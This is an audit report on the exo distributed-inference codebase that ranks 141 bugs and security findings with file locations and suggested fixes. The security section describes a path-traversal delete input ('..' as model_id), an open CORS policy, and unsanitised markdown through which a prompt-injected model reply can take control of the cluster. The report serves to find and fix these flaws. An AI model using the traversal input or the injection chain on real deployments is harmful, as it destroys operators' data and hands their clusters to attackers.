# exo improvement audit

*Repository state: `master` @ 40f1785. Companion to [architecture.md](architecture.md), which explains the
mechanisms these findings sit in.*

One hundred and forty-nine findings from a fourteen-lens read of the exo source, one hundred and forty-one
after merging duplicates, grouped into eleven themes and ranked. **Every critical and high finding was
re-verified against the cited code before it was written here.** Medium and low findings are reported as the
finders returned them and are labelled that way.

| | |
| --- | --- |
| **Findings** | 141 unique (149 reported, 8 merged) — 39 critical/high, 63 medium, 39 low |
| **Verified by hand** | 44 of 141 — all 39 critical/high, plus 5 quoted mediums |
| **Coverage** | 14 of 17 lenses — image engine, placement algorithm and type discipline not run |

## Contents

- [Method and coverage](#method-and-coverage)
- [The twelve to do first](#the-twelve-to-do-first)
- [Eleven themes](#eleven-themes)
- [Quick wins and strategic changes](#quick-wins-and-strategic-changes)
- [Finding reference](#finding-reference)

## Method and coverage

Fourteen finders each read one slice of the repository through one lens — control-plane correctness, worker
supervision, the MLX engine, concurrency, resilience, security, performance, API compatibility, dead code and
drift, the Rust transport, the dashboard, downloads, test gaps, and build and dependencies — and returned
findings with `file:line` evidence. The results were deduplicated by location.

The planned adversarial-verification stage did not run. Rather than present unverified claims, every critical
and high finding was re-verified by opening the cited lines; all 41 held. Five medium findings that this
document quotes directly were checked the same way. Everything else is marked `finder-reported` and should be
read as a strong lead, not an established fact. The hit rate on the verified set was 41 for 41, which is
reason to take the rest seriously.

- **Not covered.** Three lenses never ran: the image-generation engine, the placement algorithm as a whole,
  and type discipline against `RULES.md`. The placement *cost* finding (F1) came from the performance lens.
  The algorithm's other blind spots — no bandwidth term, no capacity accounting, port guessing — are
  described in the architecture guide but were not audited here.
- **Severity** is about consequence for an operator or user, not code ugliness.
- **Effort.** S is under a day in one file, M is days across a few files, L is an architectural change.
- Eight findings were duplicates from different lenses. They are listed with a pointer to their canonical
  entry rather than removed, so a reader who arrives from one lens still finds the row.

## The twelve to do first

Ordered by consequence per unit of effort. Each one is verified. Most are one-file changes.

1. **Validate `ModelId` at construction and refuse any resolved path outside the models directory.** (F2, critical, effort S, `src/exo/download/download_utils.py:249`)

   Today `DELETE /download/<node>/..` from any LAN host — or any web page, given the CORS policy — removes `~/.exo` on every node: models, event logs, identity, PID file. One regex and one `resolve().parent` check.

2. **Add `--extra mlx` to the release workflow's `uv sync --locked`.** (F31, high, effort S, `.github/workflows/build-app.yml:172`)

   The PyInstaller spec exits when `mlx` is not importable, and it has not been a core dependency since #2087. No DMG can currently be built from this workflow.

3. **Catch `ValidationError` around `publish_bytes` in the router receive loop and `continue`.** (F10, high, effort S, `src/exo/routing/router.py:200`)

   One undecodable payload on any topic — a version-skewed peer, a stray publisher — exits every node that receives it, which is all of them.

4. **Bind `127.0.0.1` by default, drop `CORSMiddleware`, add an opt-in bearer token.** (F12, high, effort M, `src/exo/api/main.py:337`)

   The dashboard is same-origin so CORS buys nothing; `*` plus credentials lets any page the operator visits read `/events` and drive the cluster. Paired with F13 this is the whole attack surface.

5. **Materialise non-streaming collectors before building the response; raise `HTTPException(500)` on `ErrorChunk`.** (F3, high, effort M, `src/exo/api/main.py:942`)

   A failed completion currently returns HTTP 200 with an empty body, so every SDK reports a JSON parse error and retry logic keyed on 5xx never fires. F4 and F16 are the streaming twins of this.

6. **Call `_mlx_gen.remove(uid)` when a request ends on a user stop sequence.** (F11, high, effort S, `src/exo/worker/engines/mlx/generator/batch_generate.py:464`)

   Stop-terminated requests stay in the batch as zombie rows until EOS or 32k tokens, consuming a decode slot and GPU time. Common in agent and code-completion workloads.

7. **Compute cycles once per previews call and bound the enumeration by length.** (F1, critical, effort M, `src/exo/shared/topology.py:203`)

   Simple-cycle enumeration is factorial in mesh size; the previews endpoint runs it 4N times on the event loop, blocking every SSE stream and election message for the duration.

8. **Bound `start_task`'s ack wait with the timeout constants that already exist.** (F35, high, effort M, `src/exo/worker/runner/supervisor.py:299`)

   `PREFILL_TIMEOUT_SECONDS` and `DECODE_TIMEOUT_SECONDS` are defined and never read. A runner blocked in a collective freezes the node's planner and all cancellation.

9. **Sanitise rendered markdown with DOMPurify and escape the LaTeX re-injection paths.** (F13, high, effort S, `dashboard/src/lib/components/MarkdownContent.svelte:537`)

   Model output executes in the control-plane origin. With F12 fixed this is contained to the dashboard; with F12 open it is remote cluster control from a prompt.

10. **Resolve the dashboard directory lazily in `API`, not at `constants` import.** (F9, high, effort S, `src/exo/shared/constants.py:65`)

   `uv run pytest` fails collection with 29 errors on any checkout without `npm run build`. The documented pre-commit check does not work for a backend-only contributor.

11. **Default `--namespace` from `EXO_ZENOH_NAMESPACE` and fix the README.** (F5, high, effort S, `src/exo/main.py:347`)

   The macOS app's Cluster Namespace setting is inert and the README's variable crashes startup. Users trying to isolate a dev cluster get neither isolation nor an error.

12. **Make `download_shard` raise, or emit `DownloadFailed`, when the file list cannot be fetched.** (F18, high, effort S, `src/exo/download/download_utils.py:898`)

   An HF 401/403 is converted to a not-started progress that nobody reads; the download silently no-ops and the instance stalls at load forever with no signal.

## Eleven themes

Each theme names the design cause behind a cluster of findings, because fixing the cause usually retires
several rows at once. Full evidence, failure mechanism and the specific change for every finding are in the
[finding reference](#finding-reference).

### Errors are swallowed before they reach the client

*13 findings, 6 verified.*

Every adapter turns an internal `ErrorChunk` into silence. The Anthropic and Responses streams `break` on it and then emit a syntactically complete, successful-looking message; non-streaming routes wrap a collector generator in a `StreamingResponse`, so a failure after the 200 status line yields an empty body; the API's own cleanup sends `TaskFinished` from inside a cancelled scope. The common cause is that error is not a first-class outcome in the chunk-to-wire translation — it is handled as an early exit from the success path.

| ID | Severity | Status | Location | Finding | Effort |
| --- | --- | --- | --- | --- | --- |
| F3 | high | verified | `src/exo/api/main.py:942` | Non-streaming completions return HTTP 200 with an empty body when inference fails | M |
| F4 | high | verified | `src/exo/api/adapters/claude.py:378` | Claude streaming swallows ErrorChunk and emits a clean message_stop with stop_reason null | S |
| F16 | high | verified | `src/exo/api/adapters/responses.py:526` | Responses streaming swallows ErrorChunk and emits response.completed with status "completed" | S |
| F33 | high | verified | `src/exo/api/main.py:1980` | API asserts ChunkGenerated for image commands is an ImageChunk, so the supervisor's crash ErrorChunk (and any image-engine ErrorChunk) crashes the whole node | S |
| F34 | high | verified | `src/exo/api/main.py:304` | API.reset drops the generation-queue dicts without closing the senders, so every request in flight during a master change hangs forever behind SSE keep-alives | S |
| F39 | high | verified | `src/exo/api/main.py:786` | _token_chunk_stream cleanup runs in a cancelled scope: TaskFinished is dropped on client disconnect and TaskCancelled is dropped when the generator is finalized at a yield | S |
| F61 | medium | finder-reported | `src/exo/api/main.py:2006` | Instance deletion (node loss or user delete) closes generation streams with no error: SSE clients get a silent truncation, non-streaming clients get a 200 with partial text or a bare 500 from an assert | S |
| F64 | medium | finder-reported | `src/exo/api/main.py:320` | Only HTTPException gets the OpenAI error envelope; validation and Ollama parse failures return 422 detail lists or plain-text 500 | S |
| F95 | medium | finder-reported | `src/exo/api/main.py:787` | TaskFinished is sent from a finally block inside a cancelled scope, so every client disconnect leaks the task (with its full prompt/images) into replicated cluster state forever; nothing reaps terminal tasks | S |
| F115 | low | finder-reported | `src/exo/api/adapters/chat_completions.py:203` | Streaming chat chunks are tagged object="chat.completion" instead of "chat.completion.chunk" | S |
| F136 | low | finder-reported | `src/exo/api/adapters/ollama.py:385` | Ollama error frames drop the error text and use a non-Ollama done_reason instead of {"error": ...} | S |
| F140 | low | finder-reported | `src/exo/api/adapters/chat_completions.py:227` | Chat/Ollama streams end with no terminal frame when the channel closes without a finish_reason | S |
| F142 | low | finder-reported | `src/exo/api/adapters/claude.py:358` | Claude streaming reports input_tokens=0 and message_delta omits input_tokens | S |

### Any host on the LAN, or any web page, owns the cluster

*10 findings, 6 verified.*

The API binds `0.0.0.0` with `allow_origins=['*']` *and* `allow_credentials=True`, has no authentication, and exposes both cluster mutation and full disclosure (`/events` dumps every prompt and completion). The dashboard renders model output through `{@html}` with no sanitizer, so a prompt-injected reply can drive those endpoints from the control-plane origin. A path-traversal in the delete route turns that reach into `rmtree(~/.exo)`. The zenoh mesh has no transport auth. These compose: each is serious alone, together they are one exploit chain.

| ID | Severity | Status | Location | Finding | Effort |
| --- | --- | --- | --- | --- | --- |
| F2 | critical | verified | `src/exo/download/download_utils.py:249` | DELETE /download/{node}/{model_id} with model_id '.' or '..' rmtree's the models directory or its parent (~/.exo) on any node | S |
| F12 | high | verified | `src/exo/api/main.py:337` | API binds 0.0.0.0 with no authentication and CORS allow_origins=['*'] + allow_credentials=True, so any web page can drive the cluster and read the full prompt/response event log | M |
| F13 | high | verified | `dashboard/src/lib/components/MarkdownContent.svelte:537` | Dashboard renders model output via {@html} with no sanitizer; raw HTML and LaTeX-placeholder paths give model responses script execution in the control-plane origin | S |
| F14 | high | verified | `app/EXO/EXO/Services/BugReportService.swift:173` | Bug reporter uploads the complete conversation history (prompts, completions, uploaded images) plus hardware UUID, MAC, Wi-Fi SSID and username, disclosed only as 'Diagnostic logs' | M |
| F21 | high | verified | `.github/workflows/build-app.yml:32` | Sparkle private signing key is job-level env and the Developer ID keychain is unlocked before dependency/import code runs, so any compromised package can sign updates | S |
| F25 | high | verified | `rust/networking/src/lib.rs:31` | zenoh mesh has no transport auth or TLS: any host that can reach TCP 52414 can read prompts/tokens in cleartext and publish commands or election messages; namespace only gates discovery | L |
| F49 | medium | finder-reported | `src/exo/api/main.py:1972` | API DiskEventLog persists every prompt, generated token and uploaded image to ~/.exo/event_log/api in plaintext with 5 rotations, and GET /events replays it unauthenticated | S |
| F62 | medium | finder-reported | `src/exo/api/adapters/chat_completions.py:49` | image_url in chat/claude/responses requests is fetched server-side with no host restrictions or size cap, before the model is even validated (SSRF + memory DoS) | S |
| F69 | medium | finder-reported | `.github/workflows/build-app.yml:196` | Sparkle CLI tarball (a beta) is fetched without any integrity check and then handed the ED25519 private key | S |
| F97 | medium | finder-reported | `src/exo/download/download_utils.py:673` | File paths from the HF tree listing are used as local write targets without traversal checks, and the integrity hash comes from the same server; unsafe when HF_ENDPOINT is a mirror | S |

### One bad message or exception takes the whole node down

*6 findings, 4 verified.*

Long-lived loops are started directly in the root task group and have no error boundary. The router re-raises a Pydantic `ValidationError` from any topic; the download coordinator's command loop catches nothing; the ordered buffer *asserts* on index collision; the API asserts on chunk type. Because every node receives the same broadcast, a single malformed payload can exit the entire cluster at once. The Rust side compounds this by silently dropping inbound messages when its 1024-slot channel fills.

| ID | Severity | Status | Location | Finding | Effort |
| --- | --- | --- | --- | --- | --- |
| F10 | high | verified | `src/exo/routing/router.py:200` | One undecodable message on any topic terminates the whole node: Router._networking_recv re-raises pydantic ValidationError | S |
| F28 | high | verified | `src/exo/download/coordinator.py:160` | DownloadCoordinator command loop has no error boundary; any unexpected exception crashes the whole exo process | S |
| F36 | high | verified | `rust/networking/src/swarm.rs:174` | Subscriber callback drops inbound messages silently when the 1024-slot to_topics channel is full | S |
| F41 | high | verified | `src/exo/api/main.py:307` | API.reset closes the old event receiver while the old _apply_state task is still iterating it; the resulting EventRouterClosedResourceError is uncaught in API.run and takes down the whole node | S |
| F58 | medium | finder-reported | `src/exo/utils/event_buffer.py:22` | OrderedBuffer.ingest asserts on index collision; inside EventRouter._run_ext_in that assertion kills the whole process on one bad GlobalForwarderEvent | S |
| F100 | medium | finder-reported | `rust/networking/src/swarm.rs:122` | Publisher put() with CongestionControl::Block runs inside the single swarm loop and parks inbound delivery for up to 5 s | M |

### Waits without deadlines wedge the worker

*9 findings, 4 verified.*

The worker's planner is one sequential loop that `await`s the runner's acknowledgement with no bound, and the runner only acknowledges after its current `step()` returns — which includes a full synchronous prefill for any newly admitted request. A wedged or slow runner therefore freezes planning and cancellation for the whole node. The constants that were meant to bound this (`PREFILL_TIMEOUT_SECONDS`, `DECODE_TIMEOUT_SECONDS`) exist and are never read. Separately, stop-sequence-terminated requests are never removed from the MLX batch, so they keep consuming decode slots until EOS.

| ID | Severity | Status | Location | Finding | Effort |
| --- | --- | --- | --- | --- | --- |
| F15 | high | verified | `src/exo/worker/engines/mlx/generator/batch_generate.py:234` | BatchGenerator admits new requests by running their full prefill synchronously, stalling every in-flight decode stream | L |
| F11 | high | verified | `src/exo/worker/engines/mlx/generator/batch_generate.py:464` | Stop-sequence-terminated requests stay in the mlx BatchGenerator as zombie rows until EOS/max_tokens | S |
| F23 | high | verified | `src/exo/worker/main.py:375` | plan_step awaits TaskAcknowledged with no timeout, so a busy or wedged runner freezes the Worker and defers cancellation until prefill completes | M |
| F35 | high | verified | `src/exo/worker/runner/supervisor.py:299` | RunnerSupervisor.start_task waits for the runner's ack with no timeout, so a runner hung in a collective (peer host lost) freezes the whole worker planner | M |
| F47 | medium | finder-reported | `src/exo/worker/runner/runner.py:362` | Runner hangs forever in main() after consuming _TaskStreamClosed inside the generation loop, so every teardown during a generation ends in SIGTERM after 3 s | S |
| F73 | medium | finder-reported | `src/exo/worker/runner/runner.py:143` | PrefillTask stays in the runner work queue after the 3 s pickup timeout, so the runner later performs a full prefill for a request whose socket is already closed | S |
| F72 | medium | finder-reported | `src/exo/utils/async_process.py:100` | Runner processes are orphaned with the model resident when the parent exo process is killed or crashes — no PDEATHSIG or parent-pid watchdog, and the child holds both pipe ends so it never sees EOF | S |
| F148 | low | finder-reported | `src/exo/utils/async_process.py:236` | AsyncProcess termination runs an unbounded kill loop inside a shielded scope, so an unkillable child blocks node shutdown forever | S |
| F147 | low | finder-reported | `src/exo/worker/runner/supervisor.py:317` | cancel_task escalates a &gt;0.5 s IPC send into runner termination, so scheduling jitter can kill a healthy runner and cascade sibling reloads | S |

### Master change is a cluster restart, and late joiners replay history

*11 findings, 3 verified.*

A new session identity wipes every replica, kills every runner, and forgets every instance — master loss is a total inference outage requiring manual re-placement. There is no state snapshot, so a joining node starts its ordered buffer at index 0 and replays the entire session log 1000 events at a time, each batch broadcast to every node. The election can also diverge permanently: an equal-clock ballot that disagrees with the current session is appended to a dead candidate list and never triggers a new round.

| ID | Severity | Status | Location | Finding | Effort |
| --- | --- | --- | --- | --- | --- |
| F24 | high | verified | `src/exo/main.py:257` | Any master change is a cluster-wide reset: every node kills all runner processes and forgets all instances, so master loss = total inference outage requiring manual re-placement | L |
| F26 | high | verified | `src/exo/master/main.py:457` | Late-joining node replays the entire per-token event history in 1000-event broadcast rounds; no state snapshot exists | L |
| F22 | high | verified | `src/exo/shared/election.py:157` | A single lost or late election message leaves two masters permanently: same-clock disagreement never triggers a new round | M |
| F93 | medium | finder-reported | `src/exo/shared/types/commands.py:125` | Commands carry no SessionId, so a master executes requests from nodes that are following a different session and the requester never sees the result | M |
| F96 | medium | finder-reported | `src/exo/master/main.py:486` | Node loss is detected only by a 30 s last_seen reaper on a 10 s tick, then needs another tick for InstanceDeleted; the router's immediate disconnect signal is ignored and the dead node's runner statuses are never cleared, so the master keeps routing to the broken instance for ~50 s | M |
| F104 | medium | finder-reported | `src/exo/shared/election.py:171` | Every peer connect/disconnect starts a 3 s election round that pauses the API on every node; a link flapping faster than 3 s cancels each round before it resolves and stalls the whole cluster's API indefinitely | M |
| F101 | medium | finder-reported | `src/exo/shared/election.py:198` | Two election campaigns can run concurrently when two rounds are queued in the same loop iteration, emitting a spurious self-election before the real result | S |
| F114 | low | finder-reported | `src/exo/routing/event_router.py:136` | Replayed (stale) events make every up-to-date node fire a RequestEventLog nack, amplifying replay traffic and inflating the commands_seen tiebreaker | S |
| F128 | low | finder-reported | `src/exo/shared/election.py:232` | The end-of-round status rebroadcast is appended as a second candidate, inflating the winner's seniority beyond the cluster size | S |
| F141 | low | finder-reported | `src/exo/master/main.py:162` | Demoting a master zstd-compresses the entire session log synchronously on the event loop, stalling election and event handling for the duration | S |
| F146 | low | finder-reported | `src/exo/routing/event_router.py:114` | EventRouter._ingest registers the out_for_delivery entry after the send checkpoint, so an ack that arrives during the yield is lost and the event is retried for the session lifetime | S |

### The release and test pipelines do not test what ships

*18 findings, 10 verified.*

CI runs pytest only on macOS, so both Linux targets ship with zero Python tests executed. The release workflow's `uv sync --locked` no longer installs `mlx` since it moved to an extra, so the PyInstaller step exits before any DMG is built. Tests cannot even be collected without a dashboard build because the path is resolved at import time. The one master test rotates the operator's real event log under `$HOME`. The integration harness has a positional-argument bug that makes the only node-recovery test permanently red, and an `all()` that should be `any()`. The tensor-parallel correctness test is skipped with a message admitting it does not pass.

| ID | Severity | Status | Location | Finding | Effort |
| --- | --- | --- | --- | --- | --- |
| F9 | high | verified | `src/exo/shared/constants.py:65` | exo.shared.constants resolves the dashboard build at import time, so `uv run pytest` fails collection on any checkout without `npm run build` | S |
| F7 | high | verified | `tests/test_resilience.py:36` | test_resilience.py passes 60 as expected_nodes, so the only node-recovery test can never pass | S |
| F8 | high | verified | `tools/src/exo_tools/harness.py:643` | is_model_downloaded() uses all() so it is True for an empty list and False whenever any other model is present | S |
| F19 | high | verified | `.github/workflows/pipeline.yml:106` | CI runs pytest only on macOS; both Linux targets ship with zero Python tests executed | M |
| F20 | high | verified | `src/exo/master/tests/test_master.py:89` | test_master.py constructs a real Master that rotates and unlinks the operator's live event log under $HOME | S |
| F31 | high | verified | `.github/workflows/build-app.yml:172` | Release workflow's `uv sync --locked` no longer installs mlx, so the PyInstaller step aborts before any DMG is built | S |
| F29 | high | verified | `src/exo/worker/tests/unittests/test_mlx/test_tp_bit_exact.py:425` | Tensor-parallel numerical correctness test is unconditionally skipped and asserts an unachievable bit-exact invariant | M |
| F30 | high | verified | `src/exo/routing/event_router.py:154` | EventRouter (session filtering, nack backoff, out_for_delivery retry) has no tests despite a recent crash fix | M |
| F44 | medium | finder-reported | `src/exo/shared/tests/test_election.py:396` | Election tie-breaker test is vacuous: it exits on the boot-time clock-0 result before the contested round resolves | S |
| F45 | medium | verified | `.github/workflows/build-app.yml:97` | "Ensure tag commit is on main" guard tests the inverse relation (main is ancestor of tag) and passes tags on side branches | S |
| F70 | medium | finder-reported | `Cargo.toml:60` | Every native fork (zenoh, mlx, mlx-lm, mflux, pidfile-rs, CUDA wheels) lives on a personal GitHub account and is referenced by branch or with no ref at all | M |
| F83 | medium | finder-reported | `src/exo/shared/apply.py:288` | apply() has no invariant/property tests and apply_node_timed_out is untested, so replica divergence and node-removal leaks go unnoticed | M |
| F84 | medium | finder-reported | `src/exo/main.py:180` | Master promotion/demotion (_elect_loop) and the master's node-timeout reaper are untested; the single master test can hang forever | M |
| F91 | medium | finder-reported | `src/exo/worker/runner/supervisor.py:378` | Runner crash mid-stream is covered by one synthetic private-method test; real process death, the 5 s watchdog and the exit-code-0 path are untested | M |
| F92 | medium | verified | `pyproject.toml:62` | Linux CPU install pairs mlx 0.32.0 Python bindings with mlx-cpu 0.31.2 libmlx, violating the fork's own `mlx-cpu=={version}` requirement | S |
| F108 | low | finder-reported | `dashboard/package.json:6` | Dashboard has zero automated tests; pure functions with subtle regex logic (LaTeX preprocessor, SSE parser, topology transform, model-family derivation claimed to mirror Python) are unverified | M |
| F117 | low | finder-reported | `rust/networking/src/discovery.rs:137` | Discovery wire protocol and swarm shim have zero tests; CI's cargo-nextest only runs a tokio channel toy | S |
| F119 | low | finder-reported | `dashboard/dashboard.nix:40` | Dashboard type-checking (`svelte-check`) is defined but never executed in CI or nix checks | S |

### Placement cost and download waste

*11 findings, 2 verified.*

Placement enumerates every simple cycle of the topology graph, which is factorial in a fully-meshed LAN, and the previews endpoint runs it `4N` times synchronously on the node's only event loop — measured at seconds per call by ten nodes. Downloads fetch the entire repository on every node regardless of shard, and a failed file-list fetch is converted into a *not-started* progress and then discarded, so an auth failure never becomes `DownloadFailed`.

| ID | Severity | Status | Location | Finding | Effort |
| --- | --- | --- | --- | --- | --- |
| F1 | critical | verified | `src/exo/shared/topology.py:203` | Placement enumerates every simple cycle of the topology (exponential) and the previews endpoint runs it 4N times synchronously on the node's only event loop | M |
| F18 | high | verified | `src/exo/download/download_utils.py:898` | download_shard swallows file-list fetch failures (incl. HF 401/403) so the download silently no-ops and never becomes DownloadFailed | S |
| F55 | medium | finder-reported | `src/exo/download/impl_shard_downloader.py:260` | Periodic rescan queries the HF tree API for every one of the 141 catalog cards, including models the user never requested, with 5 retries each when offline | S |
| F56 | medium | finder-reported | `src/exo/download/coordinator.py:431` | Rescan re-emits an identical DownloadCompleted event for every downloaded model every 60 s; master journals and broadcasts each one | S |
| F77 | medium | finder-reported | `src/exo/download/download_utils.py:844` | Every node in a pipeline placement downloads and stores the full repository because resolve_allow_patterns unconditionally returns ['*'] | L |
| F81 | medium | finder-reported | `src/exo/download/download_utils.py:610` | 24h file-list cache is never invalidated on failure; after an upstream re-shard, cached filenames 404 and every retry fails identically for up to a day | S |
| F82 | medium | finder-reported | `src/exo/shared/models/model_cards.py:365` | ModelCard.fetch_from_hf hard-requires model.safetensors.index.json and hidden_size&gt;0; single-file repos fail after ~15 s of retries with a misleading error, and ModelCard.load triggers this as a side effect of placement previews | M |
| F90 | medium | finder-reported | `src/exo/download/download_utils.py:706` | Resume ignores the remote ETag: a .partial larger than the new upstream file triggers a 416 loop that is never cleared, and changed-content partials are only detected after a full download | M |
| F133 | low | finder-reported | `src/exo/download/coordinator.py:203` | DownloadCoordinator treats DownloadFailed as terminal, so the dashboard's Retry button and the worker's re-request are no-ops; recovery only happens by accident when the 60 s rescan overwrites the status | S |
| F139 | low | finder-reported | `src/exo/download/download_utils.py:1030` | download_shard spawns an unreferenced asyncio task per 8 MiB chunk that rebuilds the whole RepoDownloadProgress and fans out to every callback | S |
| F145 | low | finder-reported | `src/exo/download/impl_shard_downloader.py:142` | Two cards sharing a vision weights_repo can download the same repo concurrently into the same directory with no locking on .partial files | M |

### Dashboard correctness

*10 findings, 3 verified.*

Three of the four ways to start a generation never register an `AbortController`, so Cancel is a no-op for them. A global backslash strip runs *after* code blocks are restored, corrupting every `\n` and Windows path in every snippet and its Copy button. Conversation persistence stores base64 images and 2×-scale PDF renders in one localStorage key, and the first quota overflow silently disables all persistence. The topology graph is torn down and rebuilt on every 1 Hz poll.

| ID | Severity | Status | Location | Finding | Effort |
| --- | --- | --- | --- | --- | --- |
| F6 | high | verified | `dashboard/src/lib/stores/app.svelte.ts:1942` | Cancel button is a no-op for Regenerate / Edit-and-regenerate / regenerate-from-token: those fetches never register an AbortController | S |
| F17 | high | verified | `dashboard/src/lib/components/MarkdownContent.svelte:347` | Global backslash strip runs after code blocks are restored, corrupting `\n`, `\t`, regex escapes and Windows paths in every code snippet and its Copy button | S |
| F27 | high | verified | `dashboard/src/lib/stores/app.svelte.ts:667` | Base64 images and 2x-scale PDF page renders are persisted into one localStorage key; first quota overflow silently disables ALL conversation persistence | M |
| F54 | medium | finder-reported | `dashboard/src/lib/stores/app.svelte.ts:1912` | Regenerate rebuilds the API request without attachments, images, temperature or enable_thinking, so it answers a different prompt than the original | S |
| F66 | medium | finder-reported | `dashboard/src/lib/stores/app.svelte.ts:2163` | Deleting a conversation mid-stream abandons the reader without cancel/abort, so the backend keeps generating to completion | S |
| F67 | medium | finder-reported | `dashboard/src/lib/components/TopologyGraph.svelte:164` | TopologyGraph destroys and rebuilds the entire SVG on every 1 Hz poll and on every hover, breaking tooltips and restarting the link animation | M |
| F79 | medium | finder-reported | `dashboard/src/lib/stores/app.svelte.ts:1287` | /state polled at 1 Hz with no in-flight guard, no timeout, no visibility gating; a hung request never flips isConnected and stopPolling has no caller | S |
| F80 | medium | finder-reported | `dashboard/src/lib/stores/app.svelte.ts:2639` | Per-token work is O(response length): full markdown re-parse via {@html}, token array copies, message array clones, and always-on top_logprobs=5 | M |
| F89 | medium | finder-reported | `dashboard/src/lib/components/ModelPickerModal.svelte:232` | Inline HuggingFace search effect re-fires on every 1 Hz poll, re-hitting /models/search (HF proxy) every second while a no-match query is typed, with a stale-response race | S |
| F127 | low | finder-reported | `dashboard/src/lib/components/ChatMessages.svelte:644` | Keyboard/AT users cannot reach message actions or the model picker: hover-only action bar, icon-only buttons without aria-label, click-only images, dialog with no focus management | S |

### Dead configuration and documentation drift

*17 findings, 1 verified.*

The namespace environment variable the macOS app sets is logged and never applied, while the one the README documents raises at startup. `config.toml` is created, read, broadcast cluster-wide and then rejected. Bootstrap peers are parsed, validated, then hard-fail after the PID file is taken. The Rust API is still named after libp2p. The file agents are told to obey names a crate that does not exist.

| ID | Severity | Status | Location | Finding | Effort |
| --- | --- | --- | --- | --- | --- |
| F5 | high | verified | `src/exo/main.py:347` | EXO_ZENOH_NAMESPACE is logged but never applied; README documents the env var that crashes startup; macOS app namespace setting is silently ignored | S |
| F43 | medium | finder-reported | `src/exo/main.py:353` | --bootstrap-peers / EXO_BOOTSTRAP_PEERS are parsed, validated, then hard-raise after the PID file is acquired | S |
| F51 | medium | finder-reported | `src/exo/utils/info_gatherer/info_gatherer.py:295` | config.toml is created, read, broadcast cluster-wide, and then discarded; any key in it is rejected | S |
| F52 | medium | finder-reported | `docs/api.md:5` | docs/api.md and README describe an API file that does not exist and omit 17 live routes; several documented values disagree with code | S |
| F53 | medium | finder-reported | `rust/exo_rs/src/pidfile.rs:118` | Pidfile.close() deletes the PID file, the opposite of its documented and upstream semantics | S |
| F88 | medium | finder-reported | `rust/networking/src/lib.rs:39` | zenoh session declares a required storage_manager plugin with 2 s replication and enables the adminspace, but nothing in exo uses either | S |
| F109 | low | finder-reported | `AGENTS.md:103` | AGENTS.md/CLAUDE.md (the file agents are told to obey) names a Rust crate that does not exist, mislabels the election as a bully algorithm, and calls the transport gossipsub | S |
| F116 | low | finder-reported | `src/exo/shared/constants.py:83` | libp2p-era archaeology in live code: dead topic constants with wrong values, get_node_zid ignores its argument and carries a dead Keypair body, gossipsub_* API whose docstring promises an error that is never raised | M |
| F118 | low | finder-reported | `.github/actions/unit-test/action.yml:11` | Stale build scaffolding: composite actions call just recipes that do not exist, the polished DMG script is not used by the release, and the workflow sets an env var the runtime rejects | S |
| F123 | low | finder-reported | `src/exo/utils/reactive.py:13` | Dead Python modules, types and CLI fields left in the shipped package (reactive.py, fs.py, phantom.py, NoopShardDownloader, Args.tb_only, and a dozen more) | M |
| F124 | low | finder-reported | `rust/exo_rs/src/lib.rs:84` | exo_rs carries unused extension traits and crate dependencies, and turns --zenoh-port 0 into a Rust panic instead of a Python error | S |
| F126 | low | finder-reported | `rust/exo_rs/src/networking.rs:75` | todo!/expect/assert inside pymethods surface as PanicException instead of Python errors | S |
| F137 | low | finder-reported | `rust/networking/src/swarm.rs:125` | Publishing to a topic that is not yet declared silently succeeds; docstrings promise an exception that does not exist | S |
| F138 | low | finder-reported | `pyproject.toml:187` | Global `[tool.uv] prerelease = "allow"` admits release candidates of unrelated packages into the lock | S |
| F134 | low | finder-reported | `src/exo/utils/info_gatherer/net_profile.py:113` | net_profile reachability client is created with verify=False, a TLS-verification landmine on a probe that also trusts peer-advertised IPs | S |
| F144 | low | finder-reported | `python/parts.nix:190` | devShell's editable venv resolves `exo` under `$REPO_ROOT`, but no shellHook or .envrc exports REPO_ROOT | S |
| F143 | low | finder-reported | `src/exo/download/download_utils.py:557` | HTTP session ignores lowercase proxy variables and NO_PROXY, and the HF token file is re-read on every request | S |

### Inference engine correctness

*11 findings, 3 verified.*

Findings inside the MLX path that affect output quality or throughput rather than availability: the warmup cancel-check interval is computed with `min` where `max` was meant, so it is always 100; the global RNG is re-seeded on every submit; the logits-processor history omits the current token; disaggregated prefill leaves the decode cache short and deadlocks on multi-rank instances; the prefix-cache eviction loop cannot observe freed memory and wipes everything.

| ID | Severity | Status | Location | Finding | Effort |
| --- | --- | --- | --- | --- | --- |
| F37 | high | verified | `src/exo/worker/engines/mlx/disaggregated/serve.py:44` | Disaggregated prefill leaves the decode cache 2 tokens short, and drops the prefix-cached region when start_pos &gt; 0 | M |
| F38 | high | verified | `src/exo/worker/engines/mlx/disaggregated/serve.py:49` | Disaggregated prefill on a multi-rank instance runs mx_barrier/all_gather on rank 0 only, deadlocking the runner on the first request | M |
| F42 | medium | verified | `src/exo/worker/engines/mlx/generator/generate.py:442` | warmup_inference clamps elapsed time with min() instead of max(), so the cancel-check interval is always 100 tokens | S |
| F60 | medium | finder-reported | `src/exo/worker/engines/mlx/patches/opt_batch_gen.py:75` | Patched GenerationBatch._step feeds logits processors a history missing the current token and rebuilds it from a Python list every step | S |
| F85 | medium | finder-reported | `src/exo/worker/engines/mlx/cache.py:436` | KV prefix-cache eviction loop cannot observe freed memory, so exceeding the threshold wipes every entry | S |
| F86 | medium | finder-reported | `src/exo/worker/engines/image/builder.py:172` | ImageEngine.step never returns FinishedResponse on non-primary ranks, so those runners spin at 100% CPU and stay RunnerRunning forever | S |
| F94 | medium | finder-reported | `src/exo/worker/engines/mlx/disaggregated/adapter.py:117` | Sliding-window (RotatingKVCache) layers are serialised for disaggregated prefill by raw buffer slicing, ignoring rotation/over-allocation | S |
| F106 | medium | finder-reported | `src/exo/worker/engines/mlx/auto_parallel.py:189` | Ranks sample independently with no agreement on the chosen token; any per-device logit difference desynchronises the cluster | M |
| F120 | low | finder-reported | `src/exo/worker/engines/mlx/generator/batch_generate.py:183` | Global RNG is re-seeded on every batch submit, resetting sampling for in-flight requests; seed=0 is treated as unset | S |
| F121 | low | finder-reported | `src/exo/api/main.py:1448` | image_edits silently discards malformed advanced_params (seed, steps, guidance), so callers get non-deterministic results while believing their seed was applied | S |
| F131 | low | finder-reported | `src/exo/worker/engines/mlx/patches/standard_yarn_rope.py:116` | standard_yarn_rope patch is numerically identical to upstream YarnRoPE yet freezes its signature and never wires the `truncate` option it introduces | S |

### Control-plane hygiene

*25 findings, 2 verified.*

Smaller correctness issues in the event-sourced core: the retry cap is a lifetime counter that is never reset; a node's identity and backend entries are never removed on timeout; traces are consumed without being indexed so the origin resends them forever; the API's image-dedup caches grow without bound; every token is serialised twice and written to two disk logs.

